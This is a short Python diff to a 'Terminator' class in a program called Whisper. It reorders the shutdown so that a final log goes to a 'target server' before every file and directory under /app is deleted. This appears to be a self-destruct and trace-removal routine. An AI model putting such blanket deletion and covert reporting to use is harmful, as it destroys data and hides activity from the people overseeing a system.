@@ -23,26 +23,31 @@ class Terminator:
         
         # 1. Terminate Connections (this will be handled in the main server loop)
         
-        # 2. Remove Files
-        self.remove_files()
-        
-        # 3. Send Log
+        # 2. Send Log
         self.send_final_log()
+
+        # 3. Remove Files
+        self.remove_files()
         
         # 4. End Process
         self.terminate_process()
 
     def remove_files(self):
         try:
-            # Remove the entire directory containing Whisper
-            shutil.rmtree(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+            # Remove all files and directories within /app
+            for item in os.listdir('/app'):
+                item_path = os.path.join('/app', item)
+                if os.path.isfile(item_path):
+                    os.unlink(item_path)
+                elif os.path.isdir(item_path):
+                    shutil.rmtree(item_path)
             self.logger.info("All Whisper files have been removed")
         except Exception as e:
             self.logger.error(f"Error removing files: {e}")
 
     def send_final_log(self):
         try:
-            self.data_sender.send_data("Whisper termination sequence completed")
+            self.data_sender.send_data("Whisper termination sequence started")
             self.logger.info("Final log sent to target server")
         except Exception as e:
             self.logger.error(f"Error sending final log: {e}")
